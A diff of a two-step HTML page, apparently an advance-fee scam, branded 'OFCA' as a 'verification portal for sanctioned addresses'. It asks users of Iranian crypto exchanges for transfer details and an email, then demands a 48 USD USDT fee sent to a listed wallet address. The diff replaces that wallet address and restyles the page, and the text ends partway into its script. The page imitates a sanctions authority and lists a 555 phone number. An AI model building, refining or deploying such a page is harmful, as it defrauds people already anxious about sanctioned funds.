@@ -1,545 +1,655 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>OFCA · Support</title>
-    <!-- Font & Icons -->
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: radial-gradient(circle at 30% 20%, #121724, #070a10);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Inter', sans-serif;
-            padding: 2rem 1rem;
-        }
-        .glass-card {
-            max-width: 780px;
-            width: 100%;
-            background: rgba(18, 24, 38, 0.30);
-            backdrop-filter: blur(20px) saturate(180%);
-            -webkit-backdrop-filter: blur(20px) saturate(180%);
-            border-radius: 60px;
-            padding: 2.5rem 2.8rem;
-            border: 1px solid rgba(255, 215, 180, 0.04);
-            box-shadow: 0 30px 70px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255, 215, 180, 0.04);
-            transition: all 0.2s;
-            color: #edeae4;
-        }
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            margin-bottom: 1.8rem;
-        }
-        .brand-icon {
-            font-size: 2.2rem;
-            font-weight: 200;
-            background: rgba(255,255,255,0.02);
-            padding: 0.2rem 0.9rem 0.2rem 0.7rem;
-            border-radius: 80px;
-            border: 1px solid rgba(230, 200, 160, 0.08);
-        }
-        .brand-name {
-            font-size: 2.4rem;
-            font-weight: 300;
-            letter-spacing: 6px;
-            text-transform: uppercase;
-            background: linear-gradient(135deg, #f0e3d4, #cfbeab);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 2px 12px rgba(200, 170, 140, 0.08);
-        }
-        .brand-sub {
-            font-size: 0.7rem;
-            font-weight: 200;
-            letter-spacing: 4px;
-            color: rgba(200, 185, 170, 0.25);
-            border-left: 1px solid rgba(255,215,180,0.08);
-            padding-left: 0.8rem;
-            margin-left: 0.2rem;
-        }
-        .tagline {
-            font-size: 0.75rem;
-            font-weight: 400;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: rgba(210, 195, 175, 0.6);
-            border-bottom: 1px solid rgba(255,215,180,0.04);
-            padding-bottom: 1.2rem;
-            margin-bottom: 2rem;
-        }
-        .tagline i { margin-right: 8px; opacity: 0.6; }
-        .section-title {
-            font-weight: 500;
-            font-size: 0.8rem;
-            letter-spacing: 2px;
-            color: #d6cabc;
-            border-left: 2px solid rgba(210, 180, 150, 0.2);
-            padding-left: 1rem;
-            margin-bottom: 1.6rem;
-        }
-        .step-box {
-            background: rgba(255, 255, 255, 0.015);
-            backdrop-filter: blur(6px);
-            border-radius: 40px;
-            padding: 1.8rem 2rem;
-            margin-bottom: 2.2rem;
-            border: 1px solid rgba(255, 215, 180, 0.02);
-            box-shadow: 0 12px 30px -10px rgba(0,0,0,0.5);
-        }
-        .input-group { display: flex; flex-direction: column; gap: 1.2rem; }
-        .input-field, .select-field {
-            background: rgba(0, 0, 0, 0.25);
-            border: 1px solid rgba(255, 215, 180, 0.06);
-            border-radius: 60px;
-            padding: 0.75rem 1.8rem;
-            font-size: 0.8rem;
-            font-weight: 400;
-            color: #f2ede8;
-            outline: none;
-            transition: 0.2s;
-            backdrop-filter: blur(4px);
-            width: 100%;
-            font-family: 'Inter', sans-serif;
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="12" height="8" viewBox="0 0 12 8"><path fill="%23a0907d" d="M6 8L0 0h12z"/></svg>');
-            background-repeat: no-repeat;
-            background-position: right 1.8rem center;
-            background-size: 12px 8px;
-        }
-        .select-field option { background: #171e2e; color: #edeae4; }
-        .input-field::placeholder {
-            color: rgba(210, 200, 190, 0.5);
-            font-weight: 300;
-            letter-spacing: 0.3px;
-        }
-        .select-field::placeholder { color: rgba(200, 185, 170, 0.3); font-weight: 300; }
-        .input-field:focus, .select-field:focus {
-            border-color: rgba(210, 180, 150, 0.25);
-            background: rgba(12, 16, 28, 0.6);
-            box-shadow: 0 0 20px rgba(180, 150, 120, 0.02);
-        }
-        input[type="date"] {
-            color: #f2ede8;
-            font-weight: 400;
-        }
-        input[type="date"]:not(:focus):not(:valid) {
-            color: rgba(210, 200, 190, 0.5);
-        }
-        input[type="date"]:not(:focus):not(:valid)::-webkit-datetime-edit {
-            color: rgba(210, 200, 190, 0.5);
-        }
-        input[type="date"]::-webkit-calendar-picker-indicator {
-            filter: invert(0.7);
-            opacity: 0.5;
-            cursor: pointer;
-        }
-        .btn {
-            background: rgba(40, 44, 64, 0.3);
-            border: 1px solid rgba(255, 215, 180, 0.06);
-            padding: 0.6rem 2rem;
-            border-radius: 60px;
-            font-weight: 500;
-            font-size: 0.7rem;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: #e6ddd2;
-            backdrop-filter: blur(4px);
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            width: fit-content;
-            min-width: 130px;
-            background: rgba(30, 35, 55, 0.4);
-        }
-        .btn i { margin-right: 8px; }
-        .btn:hover {
-            background: rgba(210, 180, 150, 0.04);
-            border-color: rgba(210, 180, 150, 0.15);
-            color: #fff8f0;
-        }
-        .btn-primary {
-            background: rgba(210, 180, 150, 0.03);
-            border: 1px solid rgba(210, 180, 150, 0.08);
-        }
-        .flex-row { display: flex; flex-wrap: wrap; align-items: center; gap: 1.2rem; }
-        .amount-badge {
-            font-weight: 400;
-            font-size: 1.2rem;
-            letter-spacing: 3px;
-            color: #d6cabc;
-            background: rgba(0,0,0,0.08);
-            padding: 0.2rem 1.6rem;
-            border-radius: 60px;
-            border: 1px solid rgba(255, 215, 180, 0.02);
-        }
-        .footer-contact {
-            margin-top: 1.5rem;
-            font-size: 0.65rem;
-            font-weight: 300;
-            letter-spacing: 1.8px;
-            color: rgba(200, 185, 170, 0.3);
-            border-top: 1px solid rgba(255,215,180,0.02);
-            padding-top: 1.8rem;
-            text-align: center;
-        }
-        .contact-ways {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1.6rem;
-            justify-content: center;
-            margin: 1rem 0 0.2rem;
-            font-weight: 300;
-            font-size: 0.65rem;
-            letter-spacing: 1.8px;
-            color: #a39482;
-        }
-        .contact-ways i { margin-right: 6px; opacity: 0.5; }
-        .hidden { display: none; }
-        .spinner-circle {
-            display: inline-block;
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255,215,180,0.05);
-            border-radius: 50%;
-            border-top-color: #dacfc2;
-            animation: spin 0.8s linear infinite;
-            margin-right: 12px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .network-tag {
-            font-size: 0.8rem;
-            font-weight: 400;
-            letter-spacing: 1.5px;
-            color: rgba(220, 210, 200, 0.8);
-            background: rgba(0,0,0,0.08);
-            padding: 0.3rem 1.2rem;
-            border-radius: 40px;
-            display: inline-block;
-            border: 1px solid rgba(255, 215, 180, 0.04);
-            backdrop-filter: blur(2px);
-        }
-        .network-tag i { margin-right: 8px; opacity: 0.8; }
-        .row-duo {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1.2rem;
-        }
-        .date-hint {
-            position: relative;
-        }
-        .date-hint::before {
-            content: "📅";
-            position: absolute;
-            left: 1.2rem;
-            top: 50%;
-            transform: translateY(-50%);
-            opacity: 0.3;
-            font-size: 0.9rem;
-            pointer-events: none;
-        }
-        .date-hint input[type="date"] {
-            padding-left: 3rem;
-        }
+  <meta charset="UTF-8" />
+  <meta OFCA SUPPORT" content="width=device-width, initial-scale=1.0" />
+  <title>OFCA · repository</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@200;300;400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
-        /* ===== NEW ADDRESS BOX ===== */
-        .address-wrapper {
-            background: rgba(0, 0, 0, 0.15);
-            border-radius: 28px;
-            padding: 1.2rem 1.8rem;
-            border: 1px solid rgba(255, 215, 180, 0.03);
-            backdrop-filter: blur(4px);
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-        .address-display {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            font-family: 'Inter', monospace;
-            font-weight: 400;
-            font-size: 0.8rem;
-            letter-spacing: 0.2px;
-            color: #d6cabc;
-            word-break: break-all;
-            padding: 0.2rem 0;
-        }
-        .address-display i {
-            font-size: 1rem;
-            opacity: 0.5;
-            color: #9bb8a8;
-            flex-shrink: 0;
-        }
-        .address-display span {
-            background: rgba(0,0,0,0.08);
-            padding: 0.4rem 1rem;
-            border-radius: 40px;
-            border: 1px solid rgba(255,215,180,0.02);
-            flex: 1;
-        }
-        .copy-btn-wrap {
-            display: flex;
-            justify-content: flex-end;
-        }
-        .copy-btn-elegant {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 215, 180, 0.06);
-            color: #cfc2b2;
-            padding: 0.4rem 2rem;
-            border-radius: 60px;
-            font-size: 0.65rem;
-            font-weight: 400;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            backdrop-filter: blur(2px);
-            background: rgba(0,0,0,0.06);
-        }
-        .copy-btn-elegant i {
-            font-size: 0.75rem;
-            opacity: 0.6;
-        }
-        .copy-btn-elegant:hover {
-            background: rgba(210, 180, 150, 0.04);
-            border-color: rgba(210, 180, 150, 0.12);
-            color: #f0e4d6;
-        }
+    :root {
+      --bg0: #07090f;
+      --bg1: rgba(14, 18, 28, 0.60);
+      --bg2: rgba(255,255,255,0.025);
+      --border: rgba(255, 220, 180, 0.06);
+      --border-focus: rgba(210, 180, 150, 0.22);
+      --text-hi: #ede8e1;
+      --text-md: #a89f94;
+      --text-lo: rgba(160,145,130,0.35);
+      --accent: #c8b89a;
+      --accent2: #7eab98;
+      --r-card: 48px;
+      --r-input: 100px;
+      --r-inner: 28px;
+    }
 
-        @media (max-width: 600px) {
-            .glass-card { padding: 1.8rem 1.2rem; }
-            .brand-name { font-size: 2rem; letter-spacing: 4px; }
-            .step-box { padding: 1.2rem 1rem; }
-            .row-duo { grid-template-columns: 1fr; }
-            .address-display { flex-wrap: wrap; }
-        }
-    </style>
+    body {
+      background: radial-gradient(ellipse 80% 60% at 25% 15%, #111624, var(--bg0));
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Geist', 'Inter', sans-serif;
+      padding: 2.4rem 1rem;
+      color: var(--text-hi);
+    }
+
+    /* ── card ── */
+    .card {
+      max-width: 760px;
+      width: 100%;
+      background: var(--bg1);
+      backdrop-filter: blur(28px) saturate(160%);
+      -webkit-backdrop-filter: blur(28px) saturate(160%);
+      border-radius: var(--r-card);
+      padding: 2.8rem 3rem;
+      border: 1px solid var(--border);
+      box-shadow:
+        0 40px 80px rgba(0,0,0,0.6),
+        inset 0 1px 0 rgba(255,220,180,0.04),
+        inset 0 -1px 0 rgba(0,0,0,0.3);
+    }
+
+    /* ── brand ── */
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    .brand-icon {
+      width: 42px;
+      height: 42px;
+      border-radius: 14px;
+      background: rgba(200,184,154,0.06);
+      border: 1px solid rgba(200,184,154,0.10);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1rem;
+      color: var(--accent);
+    }
+    .brand-name {
+      font-size: 1.55rem;
+      font-weight: 300;
+      letter-spacing: 10px;
+      text-transform: uppercase;
+      color: var(--text-hi);
+    }
+    .brand-dot {
+      width: 4px;
+      height: 4px;
+      border-radius: 50%;
+      background: var(--border-focus);
+      margin: 0 0.2rem;
+    }
+    .brand-sub {
+      font-size: 0.62rem;
+      font-weight: 300;
+      letter-spacing: 4px;
+      color: var(--text-lo);
+      text-transform: uppercase;
+    }
+
+    /* ── tagline ── */
+    .tagline {
+      font-size: 0.65rem;
+      font-weight: 300;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--text-lo);
+      padding-bottom: 1.6rem;
+      margin-bottom: 2rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .tagline-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: rgba(126,171,152,0.3);
+    }
+
+    /* ── section label ── */
+    .sec-label {
+      font-size: 0.6rem;
+      font-weight: 400;
+      letter-spacing: 3.5px;
+      text-transform: uppercase;
+      color: var(--text-lo);
+      margin-bottom: 1.4rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .sec-num {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 1px solid var(--border);
+      font-size: 0.55rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-md);
+    }
+
+    /* ── step box ── */
+    .step-box {
+      background: var(--bg2);
+      border-radius: var(--r-inner);
+      padding: 2rem 2.2rem;
+      margin-bottom: 0;
+      border: 1px solid var(--border);
+    }
+
+    /* ── inputs ── */
+    .input-stack { display: flex; flex-direction: column; gap: 1.1rem; }
+    .field-wrap { display: flex; flex-direction: column; gap: 0.38rem; }
+    .field-label {
+      font-size: 0.58rem;
+      font-weight: 400;
+      letter-spacing: 2.5px;
+      text-transform: uppercase;
+      color: var(--text-lo);
+      padding-left: 1.2rem;
+    }
+
+    .field {
+      background: rgba(0,0,0,0.22);
+      border: 1px solid var(--border);
+      border-radius: var(--r-input);
+      padding: 0.78rem 1.5rem;
+      font-size: 0.78rem;
+      font-weight: 300;
+      color: var(--text-hi);
+      outline: none;
+      font-family: inherit;
+      width: 100%;
+      transition: border-color 0.18s, background 0.18s;
+    }
+    .field::placeholder { color: rgba(168,159,148,0.45); }
+    .field:focus {
+      border-color: var(--border-focus);
+      background: rgba(8,10,18,0.5);
+    }
+    select.field {
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="10" height="6" viewBox="0 0 10 6"><path fill="%23887c6e" d="M5 6L0 0h10z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 1.4rem center;
+      background-size: 10px;
+      cursor: pointer;
+    }
+    select.field option { background: #10141f; color: var(--text-hi); }
+    input[type="date"].field { color: var(--text-hi); cursor: pointer; }
+    input[type="date"].field::-webkit-calendar-picker-indicator { filter: invert(0.5); opacity: 0.5; cursor: pointer; }
+
+    .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 0.85rem; }
+
+    /* ── primary btn ── */
+    .btn-next {
+      margin-top: 0.4rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(200,184,154,0.06);
+      border: 1px solid rgba(200,184,154,0.14);
+      border-radius: var(--r-input);
+      padding: 0.72rem 2rem;
+      font-size: 0.68rem;
+      font-weight: 400;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--accent);
+      cursor: pointer;
+      transition: background 0.18s, border-color 0.18s, color 0.18s;
+      font-family: inherit;
+    }
+    .btn-next:hover {
+      background: rgba(200,184,154,0.10);
+      border-color: rgba(200,184,154,0.28);
+      color: #ede3d4;
+    }
+    .btn-next i { font-size: 0.7rem; }
+
+    /* ── step 2 ── */
+    .step2-note {
+      font-size: 0.75rem;
+      font-weight: 300;
+      color: var(--text-md);
+      letter-spacing: 0.3px;
+      margin-bottom: 1.6rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .step2-note i { color: var(--accent2); opacity: 0.7; }
+
+    /* ── address block ── */
+    .addr-block {
+      background: rgba(0,0,0,0.2);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 1.2rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+    .addr-text {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.73rem;
+      font-weight: 300;
+      color: var(--text-md);
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      word-break: break-all;
+      flex: 1;
+      min-width: 0;
+    }
+    .addr-text i { color: var(--accent2); opacity: 0.6; flex-shrink: 0; }
+
+    /* ── copy btn ── */
+    .btn-copy {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border);
+      border-radius: var(--r-input);
+      padding: 0.5rem 1.3rem;
+      font-size: 0.62rem;
+      font-weight: 400;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--text-md);
+      cursor: pointer;
+      transition: all 0.18s;
+      font-family: inherit;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .btn-copy:hover {
+      background: rgba(200,184,154,0.06);
+      border-color: rgba(200,184,154,0.18);
+      color: var(--accent);
+    }
+    .btn-copy.copied {
+      border-color: rgba(126,171,152,0.3);
+      color: var(--accent2);
+    }
+    .btn-copy i { font-size: 0.7rem; }
+
+    /* ── fee row ── */
+    .fee-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin-top: 1.4rem;
+      padding: 1rem 1.5rem;
+      background: rgba(0,0,0,0.12);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+    }
+    .fee-left {
+      display: flex;
+      align-items: baseline;
+      gap: 0.5rem;
+    }
+    .fee-label {
+      font-size: 0.6rem;
+      font-weight: 300;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--text-lo);
+    }
+    .fee-amount {
+      font-size: 1.4rem;
+      font-weight: 300;
+      letter-spacing: 2px;
+      color: var(--text-hi);
+    }
+    .fee-currency {
+      font-size: 0.65rem;
+      font-weight: 300;
+      letter-spacing: 2px;
+      color: var(--text-lo);
+    }
+    .network-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(126,171,152,0.06);
+      border: 1px solid rgba(126,171,152,0.12);
+      border-radius: var(--r-input);
+      padding: 0.4rem 1rem;
+      font-size: 0.6rem;
+      font-weight: 400;
+      letter-spacing: 2px;
+      color: var(--accent2);
+    }
+    .network-pill i { opacity: 0.6; }
+
+    /* ── confirm btn ── */
+    .confirm-wrap { display: flex; justify-content: flex-end; margin-top: 1.4rem; }
+    .btn-confirm {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(200,184,154,0.05);
+      border: 1px solid rgba(200,184,154,0.13);
+      border-radius: var(--r-input);
+      padding: 0.72rem 2.2rem;
+      font-size: 0.68rem;
+      font-weight: 400;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--accent);
+      cursor: pointer;
+      transition: all 0.18s;
+      font-family: inherit;
+    }
+    .btn-confirm:disabled {
+      opacity: 0.28;
+      cursor: default;
+      pointer-events: none;
+    }
+    .btn-confirm:not(:disabled):hover {
+      background: rgba(200,184,154,0.10);
+      border-color: rgba(200,184,154,0.28);
+      color: #ede3d4;
+    }
+    .btn-confirm i { font-size: 0.7rem; }
+
+    /* ── success ── */
+    .success-row {
+      display: none;
+      align-items: center;
+      gap: 12px;
+      margin-top: 1rem;
+      font-size: 0.75rem;
+      font-weight: 300;
+      letter-spacing: 1px;
+      color: var(--text-md);
+    }
+    .success-row.show { display: flex; }
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 1.5px solid var(--border);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── footer ── */
+    .footer {
+      margin-top: 2rem;
+      padding-top: 1.6rem;
+      border-top: 1px solid var(--border);
+    }
+    .footer-note {
+      font-size: 0.6rem;
+      font-weight: 300;
+      letter-spacing: 2px;
+      color: var(--text-lo);
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+    .contacts {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+    }
+    .contact-item {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 0.65rem;
+      font-weight: 300;
+      letter-spacing: 1.5px;
+      color: var(--text-md);
+    }
+    .contact-item i { opacity: 0.4; font-size: 0.7rem; }
+
+    .hidden { display: none !important; }
+
+    @media (max-width: 580px) {
+      .card { padding: 1.8rem 1.2rem; border-radius: 32px; }
+      .row2 { grid-template-columns: 1fr; }
+      .addr-block { flex-direction: column; align-items: flex-start; }
+      .btn-copy { align-self: flex-end; }
+    }
+  </style>
 </head>
 <body>
+<div class="card">
 
-<div class="glass-card">
-    <!-- Brand -->
-    <div class="brand">
-        <span class="brand-icon"><i class="fas fa-shield-alt" style="color: #b8a692;"></i></span>
-        <span class="brand-name">OFCA</span>
-        <span class="brand-sub">· club</span>
+  <!-- brand -->
+  <div class="brand">
+    <div class="brand-icon"><i class="fas fa-shield-halved"></i></div>
+    <span class="brand-name">OFCA</span>
+    <div class="brand-dot"></div>
+    <span class="brand-sub">club</span>
+  </div>
+
+  <!-- tagline -->
+  <div class="tagline">
+    <div class="tagline-dot"></div>
+    verification portal for sanctioned addresses
+  </div>
+
+  <!-- ── STEP 1 ── -->
+  <div id="step1" class="step-box">
+    <div class="sec-label"><span class="sec-num">1</span> exchange details</div>
+    <div class="input-stack">
+      <div class="field-wrap">
+        <label class="field-label">sanctioned exchange (source)</label>
+        <select id="src" class="field">
+        <option value="" disabled selected>select an exchange…</option>
+        <option>nobitex</option>
+        <option>Wallex</option>
+        <option>bitpin</option>
+        <option>Ramzinex</option>
+        <option>bit24</option>
+        <option>other</option>
+      </select>
+      </div>
+
+      <div class="field-wrap">
+        <label class="field-label">destination exchange</label>
+        <select id="dst" class="field">
+        <option value="" disabled selected>select an exchange…</option>
+        <option>coinex</option>
+        <option>binance</option>
+        <option>kucoin</option>
+        <option>okx</option>
+        <option>bybit</option>
+        <option>gate.io</option>
+        <option>huobi</option>
+        <option>bitfinex</option>
+        <option>kraken</option>
+        <option>coinbase</option>
+        <option>other</option>
+      </select>
+      </div>
+
+      <div class="row2">
+        <div class="field-wrap">
+          <label class="field-label">how much did you send?</label>
+          <input type="text" id="amount" class="field" placeholder="e.g. 500 USD" />
+        </div>
+        <div class="field-wrap">
+          <label class="field-label">when was the transfer made?</label>
+          <input type="date" id="date" class="field" />
+        </div>
+      </div>
+
+      <div class="field-wrap">
+        <label class="field-label">your email address</label>
+        <input type="email" id="email" class="field" placeholder="we'll send updates here" />
+      </div>
+
+      <button class="btn-next" id="nextBtn">
+        <span>next step</span>
+        <i class="fas fa-arrow-right"></i>
+      </button>
+    </div>
+  </div>
+
+  <!-- ── STEP 2 ── -->
+  <div id="step2" class="step-box hidden">
+    <div class="sec-label"><span class="sec-num">2</span> payment</div>
+    <div class="step2-note">
+      <i class="fas fa-circle-check"></i>
+      Information confirmed. Send the verification fee to the address below.
     </div>
 
-    <!-- tagline -->
-    <div class="tagline">
-        <i class="fas fa-globe-americas"></i> website for sanctioned addresses
+    <div class="addr-block">
+      <div class="addr-text">
+        <i class="fas fa-wallet"></i>
+        <span>0xc8C4D2bd2A051068682D9125b0ac858570976087</span>
+      </div>
+      <button class="btn-copy" id="copyBtn">
+        <i class="fas fa-copy"></i>
+        <span>copy</span>
+      </button>
     </div>
 
-    <!-- ========== STEP 1 ========== -->
-    <div id="step1Container" class="step-box">
-        <div class="section-title"><i class="fas fa-flag" style="margin-right: 12px; opacity: 0.3;"></i> step 1 · exchange details</div>
-        <div class="input-group">
-            <select id="sanctionedSelect" class="select-field">
-                <option value="" disabled selected>— sanctioned exchange (source) —</option>
-                <option value="nobitex">nobitex</option>
-                <option value="Wallex">Wallex</option>
-                <option value="bitpin">bitpin</option>
-                <option value="Ramzinex">Ramzinex</option>
-                <option value="bit24">bit24</option>
-                <option value="other">other</option>
-            </select>
-
-            <select id="destinationSelect" class="select-field">
-                <option value="" disabled selected>— destination exchange —</option>
-                <option value="coinex">coinex</option>
-                <option value="binance">binance</option>
-                <option value="kucoin">kucoin</option>
-                <option value="okx">okx</option>
-                <option value="bybit">bybit</option>
-                <option value="gate.io">gate.io</option>
-                <option value="huobi">huobi</option>
-                <option value="bitfinex">bitfinex</option>
-                <option value="kraken">kraken</option>
-                <option value="coinbase">coinbase</option>
-                <option value="other">other</option>
-            </select>
-
-            <div class="row-duo">
-                <input type="text" id="amountInput" class="input-field" placeholder="amount sent (USD)" />
-                <div class="date-hint">
-                    <input type="date" id="dateInput" class="input-field" />
-                </div>
-            </div>
-
-            <input type="email" id="emailInput" class="input-field" placeholder="your email address" />
-
-            <button class="btn btn-primary" id="goToPaymentBtn"><i class="fas fa-arrow-right"></i> next step</button>
-        </div>
+    <div class="fee-row">
+      <div class="fee-left">
+        <span class="fee-label">fee</span>
+        <span class="fee-amount">48</span>
+        <span class="fee-currency">USD</span>
+      </div>
+      <span class="network-pill"><i class="fas fa-link"></i> BEP20 · USDT</span>
     </div>
 
-    <!-- ========== STEP 2 ========== -->
-    <div id="step2Container" class="step-box hidden">
-        <div class="section-title"><i class="fas fa-credit-card" style="margin-right: 12px; opacity: 0.3;"></i> step 2 · payment</div>
-        <div style="font-weight: 400; letter-spacing: 0.5px; color: #d4c9bc; font-size: 0.85rem; margin-bottom: 1.6rem;">
-            <i class="fas fa-check-circle" style="margin-right: 10px; opacity: 0.3;"></i> information complete. you need to pay the required fee for verification.
-        </div>
-
-        <!-- NEW ADDRESS BOX with elegant copy -->
-        <div class="address-wrapper">
-            <div class="address-display">
-                <i class="fas fa-coins"></i>
-                <span>0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
-            </div>
-            <div class="copy-btn-wrap">
-                <button class="copy-btn-elegant" id="copyAddressBtn"><i class="fas fa-copy"></i> copy address</button>
-            </div>
-        </div>
-
-        <div class="flex-row" style="justify-content: space-between; margin-top: 1.5rem; align-items: center;">
-            <div style="display: flex; align-items: center; gap: 1rem;">
-                <span style="font-weight: 400; color: #988b7b; letter-spacing: 1.5px; font-size: 0.75rem;"><i class="fas fa-dollar-sign" style="margin-right: 6px;"></i>amount</span>
-                <span class="amount-badge">48 USD</span>
-            </div>
-            <span class="network-tag"><i class="fas fa-link"></i> BEP20 · USDT</span>
-        </div>
-
-        <div class="flex-row" style="margin-top: 1.8rem; justify-content: flex-end;">
-            <button class="btn" id="confirmPaymentBtn" disabled style="opacity: 0.4; min-width: 180px;">
-                <i class="fas fa-check"></i> confirm payment
-            </button>
-        </div>
-
-        <div id="successMessage" class="hidden" style="margin-top: 1.2rem; padding: 0.4rem 0; display: flex; align-items: center; gap: 12px; font-weight: 400; letter-spacing: 1px; color: #d4d0c4;">
-            <span class="spinner-circle" id="spinnerEl"></span>
-            <span id="successText" style="font-size: 0.85rem;">your request has been submitted</span>
-        </div>
+    <div class="confirm-wrap">
+      <button class="btn-confirm" id="confirmBtn" disabled>
+        <i class="fas fa-check"></i>
+        <span>confirm payment</span>
+      </button>
     </div>
 
-    <!-- footer -->
-    <div style="margin-top: 1.2rem;">
-        <div style="font-weight: 300; letter-spacing: 1.5px; color: #b7aa9a; font-size: 0.65rem; background: rgba(0,0,0,0.06); padding: 0.8rem 1.6rem; border-radius: 80px; backdrop-filter: blur(4px); border: 1px solid rgba(255,215,180,0.01);">
-            <i class="fas fa-people-arrows" style="margin-right: 12px; opacity: 0.2;"></i>
-            people who used services from sanctioned companies can contact us via:
-        </div>
-        <div class="contact-ways">
-            <span><i class="fas fa-envelope"></i> ofca@sanction.help</span>
-            <span><i class="fas fa-telegram-plane"></i> @OFCA_support</span>
-            <span><i class="fas fa-phone-alt"></i> +1 800 555 0199</span>
-        </div>
+    <div class="success-row" id="successRow">
+      <div class="spinner" id="spinner"></div>
+      <span id="successText">processing your request…</span>
     </div>
-    <div style="margin-top: 1.2rem; font-size: 0.5rem; color: rgba(200,185,170,0.1); text-align: center; letter-spacing: 3px;">
-        <i class="fas fa-gem"></i> OFCA club · private & secure
+  </div>
+
+  <!-- footer -->
+  <div class="footer">
+    <div class="footer-note">contact us</div>
+    <div class="contacts">
+      <div class="contact-item"><i class="fas fa-envelope"></i> ofca@sanction.help</div>
+      <div class="contact-item"><i class="fab fa-telegram"></i> @OFCA_support</div>
+      <div class="contact-item"><i class="fas fa-phone"></i> +1 800 555 0199</div>
     </div>
+  </div>
+
 </div>
 
 <script>
-    (function() {
-        const step1 = document.getElementById('step1Container');
-        const step2 = document.getElementById('step2Container');
-        const goToPayment = document.getElementById('goToPaymentBtn');
-        const copyBtn = document.getElementById('copyAddressBtn');
-        const confirmBtn = document.getElementById('confirmPaymentBtn');
-        const successDiv = document.getElementById('successMessage');
-        const spinner = document.getElementById('spinnerEl');
-        const successText = document.getElementById('successText');
+(function () {
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const nextBtn = document.getElementById('nextBtn');
+  const copyBtn = document.getElementById('copyBtn');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const successRow = document.getElementById('successRow');
+  const spinner = document.getElementById('spinner');
+  const successText = document.getElementById('successText');
 
